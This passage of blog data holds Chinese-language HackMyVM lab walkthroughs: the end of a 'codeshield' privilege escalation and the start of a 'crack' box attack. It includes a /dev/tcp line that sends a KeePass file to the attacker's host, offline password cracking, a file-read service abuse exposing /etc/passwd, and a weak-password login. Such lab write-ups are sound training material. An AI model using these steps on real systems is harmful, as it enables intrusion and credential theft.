 \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557           \n  @@@@@@@@@@@@@          @@    \u2588\u2588\u2551     \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551     \u2588\u2588\u2551  \u2588\u2588\u2551           \n  @@@@@@@@@@@@@         @@@    \u2588\u2588\u2551     \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551     \u2588\u2588\u2551  \u2588\u2588\u2551           \n    @@@@@@@@@@@        @@      \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d           \n     @@@@@@@@@@      @@@        \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d            \n        @@@@@@@   @@@                     \n           @@@@@@@                                                         \n\n  _______________________________________________________________________________________________________\n |  _WARNING: This system is restricted to authorized users!___________________________________________  |\n | |                                                                                                   | |\n | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |\n | |                                                                                                   | |\n | | This system is restricted to authorized users.                                                    | | \n | | Individuals who attempt unauthorized access will be prosecuted.                                   | | \n | | If you're unauthorized, terminate access now!                                                     | | \n | |                                                                                                   | |\n | |                                                                                                   | |\n | |___________________________________________________________________________________________________| |\n |_______________________________________________________________________________________________________|\nmitchellt@192.168.205.138's password: \nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon Jan 20 07:15:11 AM UTC 2025\n\n  System load:  0.640625           Processes:               240\n  Usage of /:   29.1% of 47.93GB   Users logged in:         0\n  Memory usage: 59%                IPv4 address for enp0s3: 192.168.205.138\n  Swap usage:   0%\n\n * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s\n   just raised the bar for easy, resilient and secure K8s cluster deployment.\n\n   https://ubuntu.com/engage/secure-kubernetes-at-the-edge\n\nExpanded Security Maintenance for Applications is not enabled.\n\n10 updates can be applied immediately.\nTo see these additional updates run: apt list --upgradable\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nNew release '24.04.1 LTS' available.\nRun 'do-release-upgrade' to upgrade to it.\n\n\nmitchellt@codeshield:~$ id\nuid=1006(mitchellt) gid=1006(mitchellt) groups=1006(mitchellt)\n\n```\n\n# 3.\u63d0\u6743\n\n```bash\nmitchellt@codeshield:~$ ls -la\ntotal 112\ndrwxr-x--- 17 mitchellt mitchellt 4096 Aug 30  2023 .\ndrwxr-xr-x 14 root      root      4096 Aug 26  2023 ..\n-rw-------  1 mitchellt mitchellt  209 Aug 30  2023 .bash_history\n-rw-r--r--  1 mitchellt mitchellt  220 Aug 26  2023 .bash_logout\n-rw-r--r--  1 mitchellt mitchellt 3771 Aug 26  2023 .bashrc\ndrwx------ 11 mitchellt mitchellt 4096 Jan 20 07:14 .cache\ndrwx------ 12 mitchellt mitchellt 4096 Aug 29  2023 .config\ndrwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Desktop\ndrwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Documents\ndrwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Downloads\n-rw-------  1 mitchellt mitchellt   20 Aug 29  2023 .lesshst\ndrwx------  3 mitchellt mitchellt 4096 Aug 28  2023 .local\ndrwxrwxr-x  6 mitchellt mitchellt 4096 Aug 30  2023 mining\ndrwx------  3 mitchellt mitchellt 4096 Aug 28  2023 .mozilla\ndrwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Music\ndrwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Pictures\n-rw-r--r--  1 mitchellt mitchellt  807 Aug 26  2023 .profile\ndrwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Public\ndrwx------  3 mitchellt mitchellt 4096 Aug 29  2023 snap\ndrwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Templates\ndrwx------  6 mitchellt mitchellt 4096 Aug 28  2023 .thunderbird\n-rwxrwx---  1 mitchellt mitchellt 2401 Aug 28  2023 user.txt\n-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-clipboard-tty2-control.pid\n-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-draganddrop-tty2-control.pid\n-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-hostversion-tty2-control.pid\n-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-seamless-tty2-control.pid\n-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-vmsvga-session-tty2-control.pid\ndrwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Videos\nmitchellt@codeshield:~$ cat .bash_history\necho 'EARL!YP7DeVel@OP'| su - earlyp -c 'cp -r /home/earlyp/Development/mining .'\necho 'EARL!YP7DeVel@OP'| su - earlyp -c 'cp -r /home/earlyp/Development/mining /tmp'\ncp -r /tmp/mining .\nls\ncd mining/\nls\nexit\nmitchellt@codeshield:~$ su - earlyp\nPassword: \nearlyp@codeshield:~$ sudo -l\n[sudo] password for earlyp: \nSorry, user earlyp may not run sudo on mail.\nearlyp@codeshield:~$ ls -la\ntotal 116\ndrwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 .\ndrwxr-xr-x 14 root   root   4096 Aug 26  2023 ..\n-rw-------  1 earlyp earlyp   36 Aug 29  2023 .bash_history\n-rw-r--r--  1 earlyp earlyp  220 Jan  6  2022 .bash_logout\n-rw-r--r--  1 earlyp earlyp 3771 Jan  6  2022 .bashrc\ndrwx------ 12 earlyp earlyp 4096 Aug 23  2023 .cache\ndrwx------ 16 earlyp earlyp 4096 Aug 28  2023 .config\ndrwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Desktop\ndrwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 Development\ndrwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 Documents\ndrwxr-xr-x  5 earlyp earlyp 4096 Aug 23  2023 Downloads\ndrwx------  2 earlyp earlyp 4096 Aug 28  2023 .gnupg\ndrwx------  3 earlyp earlyp 4096 Aug 22  2023 .local\ndrwxrwxr-x  6 earlyp earlyp 4096 Aug 29  2023 mining\ndrwxrwxr-x  2 earlyp earlyp 4096 Aug 23  2023 .mono\ndrwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Music\ndrwxr-xr-x  3 earlyp earlyp 4096 Aug 23  2023 Pictures\n-rw-r--r--  1 earlyp earlyp  807 Jan  6  2022 .profile\ndrwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Public\n-rw-rw-r--  1 earlyp earlyp  233 Aug 23  2023 .recently-used\ndrwx------  3 earlyp earlyp 4096 Aug 22  2023 snap\ndrwx------  2 earlyp earlyp 4096 Aug 22  2023 .ssh\n-rw-r--r--  1 earlyp earlyp    0 Aug 22  2023 .sudo_as_admin_successful\ndrwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Templates\n-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid\n-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid\n-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-hostversion-tty2-control.pid\n-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid\n-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid\ndrwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Videos\nearlyp@codeshield:~$ cat .bash_history\ncd ~\nls\ncd Development/\nls\npwd\nexit\nearlyp@codeshield:~$ cd Development\nearlyp@codeshield:~/Development$ ls -la\ntotal 12\ndrwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 .\ndrwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..\ndrwxrwxr-x  6 earlyp earlyp 4096 Aug 28  2023 mining\nearlyp@codeshield:~/Development$ cd mining/\nearlyp@codeshield:~/Development/mining$ ls -al\ntotal 92\ndrwxrwxr-x 6 earlyp earlyp 4096 Aug 28  2023 .\ndrwxrwxr-x 3 earlyp earlyp 4096 Aug 28  2023 ..\n-rw-rw-r-- 1 earlyp earlyp  298 Aug 28  2023 circle.yml\n-rw-rw-r-- 1 earlyp earlyp  358 Aug 28  2023 CONTRIBUTING.rst\n-rw-rw-r-- 1 earlyp earlyp   46 Aug 28  2023 .coveralls.yml\n-rw-rw-r-- 1 earlyp earlyp  634 Aug 28  2023 docker-compose.yml\n-rw-rw-r-- 1 earlyp earlyp  938 Aug 28  2023 Dockerfile\ndrwxrwxr-x 4 earlyp earlyp 4096 Aug 28  2023 docs\ndrwxrwxr-x 8 earlyp earlyp 4096 Aug 28  2023 .git\n-rw-rw-r-- 1 earlyp earlyp  439 Aug 28  2023 .gitignore\n-rw-rw-r-- 1 earlyp earlyp  100 Aug 28  2023 .gitmodules\n-rw-rw-r-- 1 earlyp earlyp 1081 Aug 28  2023 LICENSE\n-rw-rw-r-- 1 earlyp earlyp  794 Aug 28  2023 Makefile\n-rw-rw-r-- 1 earlyp earlyp 3181 Aug 28  2023 manage.py\n-rw-rw-r-- 1 earlyp earlyp  161 Aug 28  2023 MANIFEST.in\ndrwxrwxr-x 9 earlyp earlyp 4096 Aug 28  2023 mining\n-rw-rw-r-- 1 earlyp earlyp 3501 Aug 28  2023 README.rst\n-rw-rw-r-- 1 earlyp earlyp   34 Aug 28  2023 requirements_dev.txt\n-rw-rw-r-- 1 earlyp earlyp  261 Aug 28  2023 requirements.txt\ndrwxrwxr-x 2 earlyp earlyp 4096 Aug 28  2023 scripts\n-rw-rw-r-- 1 earlyp earlyp  230 Aug 28  2023 setup.cfg\n-rw-rw-r-- 1 earlyp earlyp 2366 Aug 28  2023 setup.py\n-rw-rw-r-- 1 earlyp earlyp  312 Aug 28  2023 .travis.yml\n\nearlyp@codeshield:~/Development/mining$ cd ~\nearlyp@codeshield:~$ cd Desktop/\nearlyp@codeshield:~/Desktop$ ls -al\ntotal 8\ndrwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 .\ndrwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..\nearlyp@codeshield:~/Desktop$ cd ~/Documents/\nearlyp@codeshield:~/Documents$ ls -al\ntotal 12\ndrwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 .\ndrwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..\n-rw-------  1 earlyp earlyp 1918 Aug 28  2023 Passwords.kdbx\n```\n\n\u62f7\u8fc7\u53bb\u7834\u89e3\u4e00\u4e0b\n\n```bash\nearlyp@codeshield:~/Documents$ cat Passwords.kdbx > /dev/tcp/192.168.205.141/7777\n\n#kali\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 7777 > Passwords.kdbx               \nlistening on [any] 7777 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 53802\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ keepass2john Passwords.kdbx > hash\n                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (KeePass [SHA256 AES 32/64])\nCost 1 (iteration count) is 3225806 for all loaded hashes\nCost 2 (version) is 2 for all loaded hashes\nCost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes\nWill run 12 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:04:14 0.01% (ETA: 2025-02-13 23:25) 0g/s 8.313p/s 8.313c/s 8.313C/s laurita..myfamily\n0g 0:00:05:31 0.02% (ETA: 2025-02-14 05:03) 0g/s 8.264p/s 8.264c/s 8.264C/s onlyme..victoria1\n0g 0:00:08:56 0.03% (ETA: 2025-02-14 05:14) 0g/s 8.228p/s 8.228c/s 8.228C/s priscila..a1b2c3d4\nSession aborted\n```\n\n\u7206\u7834\u4e86\u516b\u5206\u949f\u8fd8\u6ca1\u51fa\u6765\uff0c\u5b9e\u5728\u7b49\u4e0d\u4e0b\u53bb\u4e86\uff0c\u6211\u76f4\u63a5\u53bb\u5176\u4ed6\u5927\u4f6c\u90a3\u91cc\u5077\u4e86\u4e2a\u5bc6\u7801`mandalorian`\uff0c\u6495.....\u8fd9\u4e2a\u5bc6\u7801\u5728868083\u884c\uff0c\u6700\u5c0f\u7684\u90fd\u572820451\u884c\n\n![Image](https://github.com/user-attachments/assets/53d42048-f033-408e-b311-b7ae95f72946)\n\n\u5feb\u901f\u7684\u5207\u56de\u53bb\u6362root\uff08\u4e0d\u7136\u4f60\u8981\u91cd\u65b0\u53cc\u51fb\uff0c\u5b83\u590d\u5236\u6709\u65f6\u95f4\u9650\u5236\uff09\n\n```bash\nearlyp@codeshield:~/Documents$ su -\nPassword: \nroot@codeshield:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\n```\n\n# 4.\u540e\u8bdd\n\n\u53bb\u770b**ll104567**\u5927\u4f6c\u7684wp\u53d1\u73b0\uff0c\u90a3\u4e2a\u7528\u6237\u4e0d\u7528\u8fd9\u4e48\u9ebb\u70e6\u83b7\u53d6\uff0c\u4f60\u76f4\u63a5\u770b\u4ed6\u865a\u62df\u673a\u56fe\u5f62\u5316\u754c\u9762\u7684\u767b\u5f55\u5c31\u597d\u4e86\uff0c\u90a3\u91cc\u5168\u6709\uff0c\u800c\u4e14**valdezk ftp**\u90a3\u91cc\uff0c\u4f5c\u8005\u662f\u8ba9\u6211\u4eec\u767b\u5f55\u90a3\u4e2a**web mail**\u67e5\u770b\u7684\uff0c\u4e0d\u662f\u76f4\u63a5\u770b\u6e90\u7801......sentence", "top": 0, "createdAt": 1751016771, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P97": {"htmlDir": "docs/post/hmv_crack.html", "labels": ["HackMyVM"], "postTitle": "hmv_crack", "postUrl": "post/hmv_crack.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/97", "commentNum": 0, "wordCount": 56426, "description": "# hmv_crack\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - crack](https://hackmyvm.eu/machines/machine.php?vm=crack)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.143\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 15:51 CST\nNmap scan report for 192.168.205.143\nHost is up (0.00043s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT      STATE SERVICE\n21/tcp    open  ftp\n4200/tcp  open  vrml-multi-use\n12359/tcp open  unknown\nMAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.46 seconds\n\n```\n\n`4000\u300112359`\u662f\u4ec0\u4e48\u7aef\u53e3\u6211\u4eec\u4e0d\u77e5\u9053\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u770b**ftp**\u7aef\u53e3\n\n# 2.\u8e29\u70b9\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ftp 192.168.205.143                         \nConnected to 192.168.205.143.\n220 (vsFTPd 3.0.3)\nName (192.168.205.143:kali): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||50526|)\n150 Here comes the directory listing.\ndrwxrwxrwx    2 0        0            4096 Jun 07  2023 upload\n226 Directory send OK.\nftp> cd upload\n250 Directory successfully changed.\nftp> ls\n229 Entering Extended Passive Mode (|||30618|)\n150 Here comes the directory listing.\n-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py\n226 Directory send OK.\nftp> mget crack.py\nmget crack.py [anpqy?]? y\n229 Entering Extended Passive Mode (|||35830|)\n150 Opening BINARY mode data connection for crack.py (849 bytes).\n100% |*****************************************************************************************|   849        1.71 MiB/s    00:00 ETA\n226 Transfer complete.\n849 bytes received in 00:00 (799.51 KiB/s)\nftp> exit\n221 Goodbye.\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat crack.py  \nimport os\nimport socket\ns = socket.socket()\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nport = 12359\ns.bind(('', port))\ns.listen(50)\n\nc, addr = s.accept()\nno = 'NO'\nwhile True:\n        try:\n                c.send('File to read:'.encode())\n                data = c.recv(1024)\n                file = (str(data, 'utf-8').strip())\n                filename = os.path.basename(file)\n                check = '/srv/ftp/upload/'+filename\n                if os.path.isfile(check) and os.path.isfile(file):\n                        f = open(file,'r')\n                        lines = f.readlines()\n                        lines = str(lines)\n                        lines = lines.encode()\n                        c.send(lines)\n                else:\n                        c.send(no.encode())\n        except ConnectionResetError:\n                pass\n\n```\n\n\u53d1\u73b0\u4e86`12359`\u7aef\u53e3\u7684\u8fd0\u884c\u811a\u672c\uff0c\u811a\u672c\u5b9e\u73b0\u6587\u4ef6\u8bfb\u53d6\u670d\u52a1\u3002\u6211\u4eec\u4e0a\u53bb\u770b\u770b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc 192.168.205.143 12359                       \nFile to read:/etc/passwd\nNOFile to read:crack.py\n['import os\\n', 'import socket\\n', 's = socket.socket()\\n', 's.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\\n', 'port = 12359\\n', 's.bind(('', port))\\n', 's.listen(50)\\n', '\\n', 'c, addr = s.accept()\\n', 'no = 'NO'\\n', 'while True:\\n', '        try:\\n', '                c.send('File to read:'.encode())\\n', '                data = c.recv(1024)\\n', '                file = (str(data, 'utf-8').strip())\\n', '                filename = os.path.basename(file)\\n', '                check = '/srv/ftp/upload/'+filename\\n', '                if os.path.isfile(check) and os.path.isfile(file):\\n', '                        f = open(file,'r')\\n', '                        lines = f.readlines()\\n', '                        lines = str(lines)\\n', '                        lines = lines.encode()\\n', '                        c.send(lines)\\n', '                else:\\n', '                        c.send(no.encode())\\n', '        except ConnectionResetError:\\n', '                pass\\n']\n```\n\n\u7ecf\u8fc7\u5c1d\u8bd5\u53ef\u4ee5\u53d1\u73b0\u53ea\u53ef\u4ee5\u67e5\u770b\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u4f46\u662f\u6839\u636e\u6e90\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u4ed6\u53ea\u662f\u5224\u65ad\u4e86`/srv/ftp/upload/` \u4e2d\u662f\u5426\u5b58\u5728\u8fd9\u4e2a\u6587\u4ef6\uff0c\u5982\u679c\u5b58\u5728\u5c31\u4f1a\u67e5\u8be2\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2a\u6211\u4eec\u611f\u5174\u8da3\u7684\u91cd\u540d\u6587\u4ef6\u53bb\u8bd5\u56fe\u8bfb\u53d6\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ftp 192.168.205.143\nConnected to 192.168.205.143.\n220 (vsFTPd 3.0.3)\nName (192.168.205.143:kali): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||19129|)\n150 Here comes the directory listing.\ndrwxrwxrwx    2 0        0            4096 Jun 07  2023 upload\n226 Directory send OK.\nftp> cd upload\n250 Directory successfully changed.\nftp> ls\n229 Entering Extended Passive Mode (|||41641|)\n150 Here comes the directory listing.\n-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py\n226 Directory send OK.\nftp> put passwd\nlocal: passwd remote: passwd\n229 Entering Extended Passive Mode (|||16042|)\n150 Ok to send data.\n100% |*****************************************************************************************|     4        0.20 KiB/s    00:00 ETA\n226 Transfer complete.\n4 bytes sent in 00:00 (0.19 KiB/s)\nftp> put id_rsa \nlocal: id_rsa remote: id_rsa\n229 Entering Extended Passive Mode (|||42637|)\n150 Ok to send data.\n100% |*****************************************************************************************|  2656      135.55 KiB/s    00:00 ETA\n226 Transfer complete.\n2656 bytes sent in 00:00 (129.95 KiB/s)\n\n```\n\n\u5229\u7528\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc 192.168.205.143 12359\nFile to read:/etc/passwd\n['root:x:0:0:root:/root:/bin/bash\\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\\n', 'sync:x:4:65534:sync:/bin:/bin/sync\\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\\n']\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ echo 'root:x:0:0:root:/root:/bin/bash\\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\\n', 'sync:x:4:65534:sync:/bin:/bin/sync\\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\\n' |grep bash\nroot:x:0:0:root:/root:/bin/bash\n, cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n\n```\n\n\u5b58\u5728`cris`\u7528\u6237\uff0c\u6211\u4eec\u5c1d\u8bd5\u8bfb\u53d6\u79c1\u94a5\n\n```bash\nFile to read:/home/cris/.ssh/id_rsa\nNO\n```\n\n\u6ca1\u6709\u6216\u8005\u6ca1\u6709\u6743\u9650\uff0c\u90a3\u6211\u4eec\u53bb\u770b\u770b\u5176\u4ed6\u7aef\u53e3\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.143:4200/\ncurl: (52) Empty reply from server\n\n```\n\n\u7a7a\u8fde\u63a5\uff0c\u6211\u53bb......\n\n\u7b49\u4f1a`12359`\u7aef\u53e3\u662f\u6587\u4ef6\u8bfb\u53d6\uff0c`21`\u662f\u8f85\u52a9\uff0c\u90a3\u8fdc\u7a0b\u8fde\u63a5\u7aef\u53e3\u5728\u54ea\uff1f\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p4200 -Pn -sV 192.168.205.143\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 16:08 CST\nNmap scan report for 192.168.205.143\nHost is up (0.00034s latency).\n\nPORT     STATE SERVICE  VERSION\n4200/tcp open  ssl/http ShellInABox\nMAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.53 seconds\n\n```\n\n\u539f\u6765\u662f\u9700\u8981**https**\u8fde\u63a5\n\n![Image](https://github.com/user-attachments/assets/35c088b0-7083-4f33-b462-c86838925382)\n\n\u5c1d\u8bd5\u4e00\u4e0b\u5f31\u5bc6\u7801(cris\uff1acris)\n\n![Image](https://github.com/user-attachments/assets/5d244afd-f3a0-47cf-ac95-b516cc8734f3)\n\n\u731c\u5bf9\u54af\n\n# 3.\u63d0\u6743\n\n```bash\ncris@crack:~$ sudo -l                                                                                                                                                                        \nMatching Defaults entries for cris on 